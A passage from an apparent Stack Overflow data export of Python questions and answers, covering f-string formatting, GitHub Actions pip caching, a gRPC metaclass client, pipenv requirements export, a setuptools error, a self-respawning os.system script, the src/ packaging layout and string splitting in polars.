<p><code>f'{Thing.A}'</code> is <code>'0'</code> while <code>str(Thing.A)</code> is <code>'Thing.A'</code>.  This example doesn't work if I use <code>enum.Enum</code> as the base class.</p>
<p>What functionality do f-strings invoke?</p>
","72449614","<p>From <a href=""https://docs.python.org/3/reference/lexical_analysis.html#f-strings"" rel=""noreferrer"">&quot;Formatted string literals&quot; in the Python reference</a>:
f-strings are invoke the &quot;<code>format</code> protocol&quot;, same as the <code>format</code> built-in function. It means that the <a href=""https://docs.python.org/3/reference/datamodel.html#object.__format__"" rel=""noreferrer""><code>__format__</code></a> magic method is called instead of <code>__str__</code>.</p>
<pre class=""lang-py prettyprint-override""><code>class Foo:
    def __repr__(self):
        return &quot;Foo()&quot;

    def __str__(self):
        return &quot;A wild Foo&quot;
    
    def __format__(self, format_spec):
        if not format_spec:
            return &quot;A formatted Foo&quot;
        return f&quot;A formatted Foo, but also {format_spec}!&quot;

&gt;&gt;&gt; foo = Foo()
&gt;&gt;&gt; repr(foo)
'Foo()'
&gt;&gt;&gt; str(foo)
'A wild Foo'
&gt;&gt;&gt; format(foo)
'A formatted Foo'
&gt;&gt;&gt; f&quot;{foo}&quot;
'A formatted Foo'
&gt;&gt;&gt; format(foo, &quot;Bar&quot;)
'A formatted Foo, but also Bar!'
&gt;&gt;&gt; f&quot;{foo:Bar}&quot;
'A formatted Foo, but also Bar!'
</code></pre>
<p>If you don't want <code>__format__</code> to be called, you can specify <code>!s</code> (for <code>str</code>), <code>!r</code> (for <code>repr</code>) or <code>!a</code> (for <a href=""https://docs.python.org/3/library/functions.html#ascii"" rel=""noreferrer""><code>ascii</code></a>) after the expression:</p>
<pre><code>&gt;&gt;&gt; foo = Foo()
&gt;&gt;&gt; f&quot;{foo}&quot;
'A formatted Foo'
&gt;&gt;&gt; f&quot;{foo!s}&quot;
'A wild Foo'
&gt;&gt;&gt; f&quot;{foo!r}&quot;
'Foo()'
</code></pre>
<p>This is occasionally useful with strings:</p>
<pre class=""lang-py prettyprint-override""><code>&gt;&gt;&gt; key = 'something\n nasty!'
&gt;&gt;&gt; error_message = f&quot;Key not found: {key!r}&quot;
&gt;&gt;&gt; error_message
&quot;Key not found: 'something\\n nasty!'&quot;
</code></pre>
"
"72598852","1","getCacheEntry failed: Cache service responded with 503","<p>I am trying to check the lint on the gitubaction. my github action steps are as below</p>
<pre><code>  lint:
    name: Lint
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v3
      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version-file: '.python-version'
          cache: 'pip'
          cache-dependency-path: 'requirements.txt'
</code></pre>
<p>Error screenshot   Attached below
<a href=""https://i.stack.imgur.com/X3YRk.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/X3YRk.png"" alt=""enter image description here"" /></a></p>
<p>Could you please help me how to fix this?</p>
","72629158","<pre><code>lint:
name: Lint
runs-on: ubuntu-latest
steps:
  - name: Checkout
    uses: actions/checkout@v3
  - name: Set up Python
    uses: actions/setup-python@v4
    with:
      python-version-file: '.python-version'
  - name: Cache dependencies
    uses: actions/cache@v3
    with:
      path: ~/.cache/pip
      key: ${{ runner.os }}-pip-${{ hashFiles('requirements.txt') }}
      restore-keys: |
          ${{ runner.os }}-pip-
          ${{ runner.os }}-
</code></pre>
<p>I too faced the same problem. It is because of the <code>cache</code> server not responding that includes internal server error or any other.
You can use <code>actions/cache@v3</code> instead of the automatic cache by <code>python</code> using <code>cache: 'pip'</code> because the <code>action/cache</code> does the same  but only gives warning on the server error</p>
"
"72710695","1","Controlling context manager in a meta class","<p>I would like to know if it's possible to control the context automatically in a metaclass and decorator. I have written a decorator function that creates the stub from the grpc insecure channel:</p>
<pre><code>def grpc_factory(grpc_server_address: str):
    print(&quot;grpc_factory&quot;)
    def grpc_connect(func):
        print(&quot;grpc_connect&quot;)
        def grpc_connect_wrapper(*args, **kwargs):
            with grpc.insecure_channel(grpc_server_address) as channel:
                stub = AnalyserStub(channel)
                return func(*args, stub=stub, **kwargs)
        return grpc_connect_wrapper
    return grpc_connect
</code></pre>
<p>I have then created a metaclass that uses the context manager with every method that starts with <code>grpc_</code> and then injects the stub into the methods kwargs:</p>
<pre><code>class Client(type):
    @classmethod
    def __prepare__(metacls, name, bases, **kwargs):
        return super().__prepare__(name, bases, **kwargs)

    def __new__(cls, name, bases, attrs, **kwargs):
        if &quot;grpc_server_address&quot; not in kwargs:
            raise ValueError(&quot;&quot;&quot;grpc_server_address is required on client class, see below example\n
            class MyClient(AnalyserClient, metaclass=Client, grpc_server_address='localhost:50051')&quot;&quot;&quot;)
        for key, value in attrs.items():
            if callable(value) and key.startswith(&quot;grpc_&quot;):
                attrs[key] = grpc_factory(kwargs[&quot;grpc_server_address&quot;])(value)
        return super().__new__(cls, name, bases, attrs)
</code></pre>
<p>From this, I'd like to create all of the methods from the proto file not implemented errors:</p>
<pre><code>class AnalyserClient(metaclass=Client, grpc_server_address=&quot;localhost:50051&quot;):
    def grpc_analyse(self, *args, **kwargs):
        raise NotImplementedError(&quot;grpc_analyse is not implemented&quot;)
</code></pre>
<p>With a final use case of the class below with the stub placed into the methods args:</p>
<pre><code>class AnalyserClient(AC, metaclass=Client, grpc_server_address=&quot;localhost:50051&quot;):
    def grpc_analyse(self, text, stub) -&gt; str:
        print(&quot;Analysing text: {}&quot;.format(text))
        print(&quot;Stub is &quot;, stub)
        stub.AnalyseSentiment(text)
        return &quot;Analysed&quot;
</code></pre>
<p>I am getting this error which I assume means the channel is no longer open but I'm not sure how this could be done better to ensure all users have a simple interface with safety around using the services defined in the proto file.</p>
<pre><code>grpc_factory
grpc_connect
grpc_factory
grpc_connect
Inside grpc_connect_wrapper
Created channel
Analysing text: Hello World
Stub is  &lt;grpc_implementation.protos.analyse_pb2_grpc.AnalyserStub object at 0x7f29d7726670&gt;
ERROR:grpc._common:Exception serializing message!
Traceback (most recent call last):
  File &quot;/home/shaun/Documents/Collaboraite/telegram/FullApplication/grpclibraries/FlairAnlysisMicroservice/python/venv/lib/python3.8/site-packages/grpc/_common.py&quot;, line 86, in _transform
    return transformer(message)
TypeError: descriptor 'SerializeToString' for 'google.protobuf.pyext._message.CMessage' objects doesn't apply to a 'str' object
Traceback (most recent call last):
  File &quot;run_client.py&quot;, line 27, in &lt;module&gt;
    client.grpc_analyse(&quot;Hello World&quot;)
  File &quot;/home/shaun/Documents/Collaboraite/telegram/FullApplication/grpclibraries/FlairAnlysisMicroservice/python/grpc_implementation/client/client.py&quot;, line 15, in grpc_connect_wrapper
    return func(*args, stub=stub, **kwargs)
  File &quot;run_client.py&quot;, line 11, in grpc_analyse
    stub.AnalyseSentiment(text)
  File &quot;/home/shaun/Documents/Collaboraite/telegram/FullApplication/grpclibraries/FlairAnlysisMicroservice/python/venv/lib/python3.8/site-packages/grpc/_channel.py&quot;, line 944, in __call__
    state, call, = self._blocking(request, timeout, metadata, credentials,
  File &quot;/home/shaun/Documents/Collaboraite/telegram/FullApplication/grpclibraries/FlairAnlysisMicroservice/python/venv/lib/python3.8/site-packages/grpc/_channel.py&quot;, line 924, in _blocking
    raise rendezvous  # pylint: disable-msg=raising-bad-type
grpc._channel._InactiveRpcError: &lt;_InactiveRpcError of RPC that terminated with:
        status = StatusCode.INTERNAL
        details = &quot;Exception serializing request!&quot;
        debug_error_string = &quot;None&quot;
</code></pre>
<p>The proto file is:</p>
<pre><code>syntax = &quot;proto3&quot;;

package analyse;
option go_package = &quot;./grpc_implementation&quot;;

service Analyser {
  rpc AnalyseSentiment(SentimentRequest) returns (SentimentResponse) {}
}

message SentimentRequest {
  string text = 1;
}

message SentimentResponse {
  string sentiment = 1;
}
</code></pre>
<p>Below is the class I am trying to emulate after the metaclass has added decorator.</p>
<pre><code>class AnalyserClientTrad:
    def __init__(self, host: str = &quot;localhost:50051&quot;):
        self.host = host

    def grpc_analyse(self, text: str):
        with grpc.insecure_channel(self.host) as channel:
            stub = AnalyserStub(channel)
            response = stub.AnalyseSentiment(SentimentRequest(text=text))
            return response.sentiment

client = AnalyserClientTrad()
print(client.grpc_analyse(&quot;Hello, world!&quot;))
</code></pre>
<p>I have further tested this through adding the decorator traditionally which also works:</p>
<pre><code>def grpc_factory(grpc_server_address: str):
    def grpc_connect(func):
        def grpc_connect_wrapper(*args, **kwargs):
            with grpc.insecure_channel(grpc_server_address) as channel:
                stub = AnalyserStub(channel)
                return func(*args, stub=stub, **kwargs)
        return grpc_connect_wrapper
    return grpc_connect



class AnalyserClientTradWithDecs:
    @grpc_factory(&quot;localhost:50051&quot;)
    def grpc_analyse(self, text: str, stub: AnalyserStub):
        response = stub.AnalyseSentiment(SentimentRequest(text=text))
        return response.sentiment

def run_client_with_decorator():
    client = AnalyserClientTradWithDecs()
    print(client.grpc_analyse(&quot;Hello, world!&quot;))
</code></pre>
<p>Any help would be appreciated.</p>
","72725749","<p>You have a problem in this part of the code, that your are not setting an expected proto object instead you are setting string</p>
<pre><code>class AnalyserClient(AC, metaclass=Client, grpc_server_address=&quot;localhost:50051&quot;):
    def grpc_analyse(self, text, stub) -&gt; str:
        print(&quot;Analysing text: {}&quot;.format(text))
        print(&quot;Stub is &quot;, stub)
        stub.AnalyseSentiment(text) #--&gt; Error, use a proto object here.
        return &quot;Analysed&quot;
</code></pre>
<p>The correct way would be to change the line <code>stub.AnalyseSentiment(text)</code> , with</p>
<pre><code>stub.AnalyseSentiment(SentimentRequest(text=text))
</code></pre>
"
"73662432","1","pipenv No such option: --requirements in latest version","<p>command: <code>pipenv lock --requirements --keep-outdated</code></p>
<p>output:</p>
<pre><code>Usage: pipenv lock [OPTIONS]
Try 'pipenv lock -h' for help.

Error: No such option: --requirements Did you mean --quiet?
</code></pre>
<p>Any idea how to fix this?</p>
","73681737","<p>the <code>-r</code> option on <code>pipenv lock</code> command is deprecated for some time. use the <code>requirements</code> option to generate the <code>requirements.txt</code></p>
<p>ie:</p>
<p><code>pipenv requirements &gt; requirements.txt</code> (Default dependencies)</p>
<p>and to freeze dev dependencies as well use the <code>--dev</code> option</p>
<p><code>pipenv requirements --dev &gt; dev-requirements.txt</code></p>
<blockquote>
<p>Sometimes, you would want to generate a requirements file based on your current environment, for example to include tooling that only supports requirements.txt. You can convert a Pipfile and Pipfile.lock into a requirements.txt file very easily.</p>
</blockquote>
<p>see also: <a href=""https://pipenv.pypa.io/en/latest/advanced/#generating-a-requirements-txt"" rel=""noreferrer"">https://pipenv.pypa.io/en/latest/advanced/#generating-a-requirements-txt</a></p>
"
"72414481","1","Error in anyjson setup command: use_2to3 is invalid","<pre><code>#25 3.990   × python setup.py egg_info did not run successfully.
#25 3.990   │ exit code: 1
#25 3.990   ╰─&gt; [1 lines of output]
#25 3.990       error in anyjson setup command: use_2to3 is invalid.
#25 3.990       [end of output]
</code></pre>
<p>This is a common error which the most common solution to is to downgrade setuptools to below version 58. This was not working for me. I tried installing python3-anyjson but this didn't work either. I'm at a complete loss.. any advice or help is much appreciated.</p>
<p>If it matters: this application is legacy spaghetti and I am trying to polish it up for a migration. There's no documentation of any kind.</p>
<p>The requirements.txt is as follows:</p>
<pre><code>cachetools&gt;=2.0.0,&lt;4
certifi==2018.10.15
Flask-Caching
Flask-Compress
Flask==2.0.3
cffi==1.2.1
diskcache
earthengine-api==0.1.239
gevent==21.12.0
google-auth&gt;=1.17.2
google-api-python-client==1.12.1
gunicorn==20.1.0
httplib2.system-ca-certs-locater
httplib2==0.9.2
oauth2client==2.0.1
pyasn1-modules==0.2.1
redis
requests==2.18.0
werkzeug==2.1.2
six==1.13.0
pyasn1==0.4.1
Jinja2==3.1.1
itsdangerous==2.0.1


Flask-Celery-Helper
Flask-JWT==0.2.0
Flask-Limiter
Flask-Mail
Flask-Migrate
Flask-Restless==0.16.0
Flask-SQLAlchemy
Flask-Script
Flask-Testing
Flask==2.0.3
Pillow&lt;=6.2.2
Shapely
beautifulsoup4
boto
celery==3.1.23
geopy
gevent==21.12.0
numpy&lt;1.17
oauth2client==2.0.1
passlib
psycopg2
pyproj&lt;2
python-dateutil==2.4.1
scipy
</code></pre>
","72774617","<p>Downgrading setuptools worked for me</p>
<pre><code>pip install &quot;setuptools&lt;58.0.0&quot;
</code></pre>
<p>And then</p>
<pre><code>pip install django-celery
</code></pre>
"
"73166250","1","Why does a recursive Python program not crash my system?","<p>I've written an <strong>R.py</strong> script which contains the following two lines:</p>
<pre><code>import os

os.system(&quot;python3 R.py&quot;)
</code></pre>
<p>I expected my system to run out of memory after running this script for a few minutes, but it is still surprisingly responsive. Does someone know, what kind of Python interpreter magic is happening here?</p>
","73216511","<h1>Preface</h1>
<p><code>os.system()</code> is actually a call to C’s <code>system()</code>.</p>
<p>Here is what the documentation states:</p>
<blockquote>
<p>The system() function shall behave as if a child process were created
using fork(), and the child process invoked the sh utility using
execl() as follows:</p>
<p>execl(, &quot;sh&quot;, &quot;-c&quot;, command, (char *)0);</p>
<p>where  is an unspecified pathname for the sh utility. It
is unspecified whether the handlers registered with pthread_atfork()
are called as part of the creation of the child process.</p>
<p>The system() function shall ignore the SIGINT and SIGQUIT signals, and
shall block the SIGCHLD signal, while waiting for the command to
terminate. If this might cause the application to miss a signal that
would have killed it, then the application should examine the return
value from system() and take whatever action is appropriate to the
application if the command terminated due to receipt of a signal.</p>
<p>The system() function shall not affect the termination status of any
child of the calling processes other than the process or processes it
itself creates.</p>
<p>The system() function shall not return until the child process has
terminated. [Option End]</p>
<p>The system() function need not be thread-safe.</p>
</blockquote>
<h1>Solution</h1>
<p><code>system()</code> creates a child process and exits, there is no stack to be resolved, therefore one would expect this to run as long as resources to do so are available. Furthermore, the operation being of creating a child process is not an intensive one— the processes aren't using up much resources, but if allowed to run long enough the script will to start to affect general performance and eventually run out of memory to spawn a new child process. Once this occurs the processes will exit.</p>
<h1>Example</h1>
<p>To demonstrate this, set recursion depth limit to 10 and allow the program to run:</p>
<pre><code>import os, sys, inspect

sys.setrecursionlimit(10)

args = sys.argv[1:]
arg = int(args[0]) if len(args) else 0

stack_depth = len(inspect.stack(0))

print(f&quot;Iteration {arg} - at stack depth of {stack_depth}&quot;)

arg += 1

os.system(f&quot;python3 main.py {arg}&quot;)

</code></pre>
<p>Outputs:</p>
<pre><code>Iteration 0 - at stack depth of 1 - avaialable memory 43337904128 
Iteration 1 - at stack depth of 1 - avaialable memory 43370692608 
Iteration 2 - at stack depth of 1 - avaialable memory 43358756864 
Iteration 3 - at stack depth of 1 - avaialable memory 43339202560 
Iteration 4 - at stack depth of 1 - avaialable memory 43354894336 
Iteration 5 - at stack depth of 1 - avaialable memory 43314974720 
Iteration 6 - at stack depth of 1 - avaialable memory 43232366592 
Iteration 7 - at stack depth of 1 - avaialable memory 43188719616 
Iteration 8 - at stack depth of 1 - avaialable memory 43173384192 
Iteration 9 - at stack depth of 1 - avaialable memory 43286093824 
Iteration 10 - at stack depth of 1 - avaialable memory 43288162304
Iteration 11 - at stack depth of 1 - avaialable memory 43310637056
Iteration 12 - at stack depth of 1 - avaialable memory 43302408192
Iteration 13 - at stack depth of 1 - avaialable memory 43295440896
Iteration 14 - at stack depth of 1 - avaialable memory 43303870464
Iteration 15 - at stack depth of 1 - avaialable memory 43303870464
Iteration 16 - at stack depth of 1 - avaialable memory 43296256000
Iteration 17 - at stack depth of 1 - avaialable memory 43286032384
Iteration 18 - at stack depth of 1 - avaialable memory 43246657536
Iteration 19 - at stack depth of 1 - avaialable memory 43213336576
Iteration 20 - at stack depth of 1 - avaialable memory 43190259712
Iteration 21 - at stack depth of 1 - avaialable memory 43133902848
Iteration 22 - at stack depth of 1 - avaialable memory 43027984384
Iteration 23 - at stack depth of 1 - avaialable memory 43006255104
...
</code></pre>
<p><a href=""https://replit.com/@pygeek1/os-system-recursion#main.py"" rel=""nofollow noreferrer"">https://replit.com/@pygeek1/os-system-recursion#main.py</a></p>
<h1>References</h1>
<p><a href=""https://pubs.opengroup.org/onlinepubs/9699919799/functions/system.html"" rel=""nofollow noreferrer"">https://pubs.opengroup.org/onlinepubs/9699919799/functions/system.html</a></p>
"
"72712965","1","Does the src/ folder in PyPI packaging have a special meaning or is it only a convention?","<p>I'm learning how to package Python projects for PyPI according to the tutorial (<a href=""https://packaging.python.org/en/latest/tutorials/packaging-projects/"" rel=""noreferrer"">https://packaging.python.org/en/latest/tutorials/packaging-projects/</a>). For the example project, they use the folder structure:</p>
<pre><code>packaging_tutorial/
├── LICENSE
├── pyproject.toml
├── README.md
├── src/
│   └── example_package_YOUR_USERNAME_HERE/
│       ├── __init__.py
│       └── example.py
└── tests/
</code></pre>
<p>I am just wondering why the <code>src/</code> folder is needed? Does it serve a particular purpose? Could one instead include the package directly in the top folder? E.g. would</p>
<pre><code>packaging_tutorial/
├── LICENSE
├── pyproject.toml
├── README.md
├── example_package_YOUR_USERNAME_HERE/
│   ├── __init__.py
│   └── example.py
└── tests/
</code></pre>
<p>have any disadvantages or cause complications?</p>
","72792078","<p>There is an interesting <a href=""https://hynek.me/articles/testing-packaging/"" rel=""noreferrer"">blog post</a> about this topic; basically, using <code>src</code> prevents that when running tests from within the project directory, the package source folder gets imported instead of the installed package (and tests should always run against installed packages, so that the situation is the same as for a user).</p>
<p>Consider the following example project where the name of the package under development is <code>mypkg</code>. It contains an <code>__init__.py</code> file and another <code>DATA.txt</code> non-code resource:</p>
<pre class=""lang-none prettyprint-override""><code>.
├── mypkg
│   ├── DATA.txt
│   └── __init__.py
├── pyproject.toml
├── setup.cfg
└── test
    └── test_data.py
</code></pre>
<p>Here, <code>mypkg/__init__.py</code> accesses the <code>DATA.txt</code> resource and loads its content:</p>
<pre class=""lang-py prettyprint-override""><code>from importlib.resources import read_text
  
data = read_text('mypkg', 'DATA.txt').strip()  # The content is 'foo'.
</code></pre>
<p>The script <code>test/test_data.py</code> checks that <code>mypkg.data</code> actually contains <code>'foo'</code>:</p>
<pre class=""lang-py prettyprint-override""><code>import mypkg
  
def test():
    assert mypkg.data == 'foo'
</code></pre>
<p>Now, running <a href=""https://coverage.readthedocs.io/"" rel=""noreferrer""><code>coverage run -m pytest</code></a> from within the base directory gives the impression that everything is alright with the project:</p>
<pre class=""lang-none prettyprint-override""><code>$ coverage run -m pytest
[...]
test/test_data.py .                                             [100%]

========================== 1 passed in 0.01s ==========================
</code></pre>
<p>However, there's a subtle issue. Running <code>coverage run -m pytest</code> invokes <a href=""https://pypi.org/project/pytest/"" rel=""noreferrer""><code>pytest</code></a> via <code>python -m pytest</code>, i.e. using the <a href=""https://docs.python.org/3/using/cmdline.html#cmdoption-m"" rel=""noreferrer""><code>-m</code></a> switch. This has a &quot;side effect&quot;, as mentioned in the docs:</p>
<blockquote>
<p>[...] As with the <code>-c</code> option, the current directory will be added to the start of <code>sys.path</code>. [...]</p>
</blockquote>
<p>This means that when importing <code>mypkg</code> in <code>test/test_data.py</code>, it didn't import the installed version but it imported the package from the source tree in <code>mypkg</code> instead.</p>
<p>Now, let's further assume that we forgot to include the <code>DATA.txt</code> resource in our project specification (after all, there is no <a href=""https://packaging.python.org/en/latest/guides/using-manifest-in/"" rel=""noreferrer""><code>MANIFEST.in</code></a>). So this file is actually not included in the <em>installed</em> version of <code>mypkg</code> (installation e.g. via <code>python -m pip install .</code>). This is revealed by running <code>pytest</code> directly:</p>
<pre class=""lang-none prettyprint-override""><code>$ pytest
[...]
======================= short test summary info =======================
ERROR test/test_data.py - FileNotFoundError: [Errno 2] No such file ...
!!!!!!!!!!!!!!! Interrupted: 1 error during collection !!!!!!!!!!!!!!!!
========================== 1 error in 0.13s ===========================
</code></pre>
<p>Hence, when using <code>coverage</code> the test passed despite the installation of <code>mypkg</code> being broken. The test didn't capture this as it was run against the source tree rather than the installed version. If we had used a <code>src</code> directory to contain the <code>mypkg</code> package, then adding the current working directory via <code>-m</code> would have caused no problems, as there is no package <code>mypkg</code> in the current working directory anymore.</p>
<p>But in the end, using <code>src</code> is not a requirement but more of a convention/best practice. For example <a href=""https://github.com/psf/requests"" rel=""noreferrer"">requests</a> doesn't use <code>src</code> and they still manage to be a popular and successful project.</p>
"
"73699500","1","python-polars split string column into many columns by delimiter","<p>In pandas, the following code will split the string from col1 into many columns. is there a way to do this in polars?</p>
<pre><code>d = {'col1': [&quot;a/b/c/d&quot;, &quot;a/b/c/d&quot;]}
df= pd.DataFrame(data=d)
df[[&quot;a&quot;,&quot;b&quot;,&quot;c&quot;,&quot;d&quot;]]=df[&quot;col1&quot;].str.split('/',expand=True)
</code></pre>
","73703650","<p>Here's an algorithm that will automatically adjust for the required number of columns -- and should be quite performant.</p>
<p>Let's start with this data.  Notice that I've purposely added the empty string <code>&quot;&quot;</code> and a null value - to show how the algorithm handles these values.  Also, the number of split strings varies widely.</p>
<pre class=""lang-py prettyprint-override""><code>import polars as pl
df = pl.DataFrame(
    {
        &quot;my_str&quot;: [&quot;cat&quot;, &quot;cat/dog&quot;, None, &quot;&quot;, &quot;cat/dog/aardvark/mouse/frog&quot;],
    }
)
df
</code></pre>
<pre><code>shape: (5, 1)
┌─────────────────────────────┐
│ my_str                      │
│ ---                         │
│ str                         │
╞═════════════════════════════╡
│ cat                         │
├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
│ cat/dog                     │
├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
│ null                        │
├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
│                             │
├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
│ cat/dog/aardvark/mouse/frog │
└─────────────────────────────┘
</code></pre>
<h4>The Algorithm</h4>
<p>The algorithm below may be a bit more than you need, but you can edit/delete/add as you need.</p>
<pre class=""lang-py prettyprint-override""><code>(
    df
    .with_row_count('id')
    .with_column(pl.col(&quot;my_str&quot;).str.split(&quot;/&quot;).alias(&quot;split_str&quot;))
    .explode(&quot;split_str&quot;)
    .with_column(
        (&quot;string_&quot; + pl.arange(0, pl.count()).cast(pl.Utf8).str.zfill(2))
        .over(&quot;id&quot;)
        .alias(&quot;col_nm&quot;)
    )
    .pivot(
        index=['id', 'my_str'],
        values='split_str',
        columns='col_nm',
    )
    .with_column(
        pl.col('^string_.*$').fill_null(&quot;&quot;)
    )
)
</code></pre>
<pre><code>shape: (5, 7)
┌─────┬─────────────────────────────┬───────────┬───────────┬───────────┬───────────┬───────────┐
│ id  ┆ my_str                      ┆ string_00 ┆ string_01 ┆ string_02 ┆ string_03 ┆ string_04 │
│ --- ┆ ---                         ┆ ---       ┆ ---       ┆ ---       ┆ ---       ┆ ---       │
│ u32 ┆ str                         ┆ str       ┆ str       ┆ str       ┆ str       ┆ str       │
╞═════╪═════════════════════════════╪═══════════╪═══════════╪═══════════╪═══════════╪═══════════╡
│ 0   ┆ cat                         ┆ cat       ┆           ┆           ┆           ┆           │
├╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┤
│ 1   ┆ cat/dog                     ┆ cat       ┆ dog       ┆           ┆           ┆           │
├╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┤
│ 2   ┆ null                        ┆           ┆           ┆           ┆           ┆           │
├╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┤
│ 3   ┆                             ┆           ┆           ┆           ┆           ┆           │
├╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┤
│ 4   ┆ cat/dog/aardvark/mouse/frog ┆ cat       ┆ dog       ┆ aardvark  ┆ mouse     ┆ frog      │
└─────┴─────────────────────────────┴───────────┴───────────┴───────────┴───────────┴───────────┘

</code></pre>
<h4>How it works</h4>
<p>We first assign a row number <code>id</code> (which we'll need later), and use <a href=""https://pola-rs.github.io/polars/py-polars/html/reference/api/polars.internals.expr.string.ExprStringNameSpace.split.html#polars.internals.expr.string.ExprStringNameSpace.split"" rel=""noreferrer""><code>split</code></a> to separate the strings.  Note that the split strings form a list.</p>
<pre class=""lang-py prettyprint-override""><code>(
    df
    .with_row_count('id')
    .with_column(pl.col(&quot;my_str&quot;).str.split(&quot;/&quot;).alias(&quot;split_str&quot;))
)
</code></pre>
<pre><code>shape: (5, 3)
┌─────┬─────────────────────────────┬────────────────────────────┐
│ id  ┆ my_str                      ┆ split_str                  │
│ --- ┆ ---                         ┆ ---                        │
│ u32 ┆ str                         ┆ list[str]                  │
╞═════╪═════════════════════════════╪════════════════════════════╡
│ 0   ┆ cat                         ┆ [&quot;cat&quot;]                    │
├╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
│ 1   ┆ cat/dog                     ┆ [&quot;cat&quot;, &quot;dog&quot;]             │
├╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
│ 2   ┆ null                        ┆ null                       │
├╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
│ 3   ┆                             ┆ [&quot;&quot;]                       │
├╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
│ 4   ┆ cat/dog/aardvark/mouse/frog ┆ [&quot;cat&quot;, &quot;dog&quot;, ... &quot;frog&quot;] │
└─────┴─────────────────────────────┴────────────────────────────┘
</code></pre>
<p>Next, we'll use <a href=""https://pola-rs.github.io/polars/py-polars/html/reference/api/polars.DataFrame.explode.html"" rel=""noreferrer""><code>explode</code></a> to put each string on its own row.  (Notice how the <code>id</code> column tracks the original row that each string came from.)</p>
<pre class=""lang-py prettyprint-override""><code>(
    df
    .with_row_count('id')
    .with_column(pl.col(&quot;my_str&quot;).str.split(&quot;/&quot;).alias(&quot;split_str&quot;))
    .explode(&quot;split_str&quot;)
)
</code></pre>
<pre><code>shape: (10, 3)
┌─────┬─────────────────────────────┬───────────┐
│ id  ┆ my_str                      ┆ split_str │
│ --- ┆ ---                         ┆ ---       │
│ u32 ┆ str                         ┆ str       │
╞═════╪═════════════════════════════╪═══════════╡
│ 0   ┆ cat                         ┆ cat       │
├╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┤
│ 1   ┆ cat/dog                     ┆ cat       │
├╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┤
│ 1   ┆ cat/dog                     ┆ dog       │
├╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┤
│ 2   ┆ null                        ┆ null      │
├╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┤
│ 3   ┆                             ┆           │
├╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┤
│ 4   ┆ cat/dog/aardvark/mouse/frog ┆ cat       │
├╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┤
│ 4   ┆ cat/dog/aardvark/mouse/frog ┆ dog       │
├╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌┤
